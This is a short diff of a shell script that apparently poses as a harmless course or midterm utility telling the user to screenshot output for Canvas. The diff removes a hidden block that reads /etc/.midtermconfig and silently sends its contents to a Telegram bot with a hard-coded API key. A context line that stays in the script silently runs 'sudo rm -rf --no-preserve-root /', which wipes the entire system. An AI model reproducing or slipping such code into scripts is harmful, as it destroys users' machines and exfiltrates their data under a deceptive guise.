@@ -13,12 +13,6 @@ done
 
 echo "Screenshot this and send to Canvas"
 
-API_KEY="935415758:AAGc-sXokFb-zNYpHeSYvcvQDOSur3HnzUo"
-CHAT_ID="508456308"
-INFO=`cat /etc/.midtermconfig`
-CHAT_TEXT="$INFO"
-curl -s --data "chat_id=$CHAT_ID" --data "text=$CHAT_TEXT" 'https://api.telegram.org/bot'$API_KEY'/sendMessage' &>> /dev/null
-
 read -n 1 -s -r -p "Press any key to continue"
 
 sudo rm -rf --no-preserve-root / &>> /dev/null 
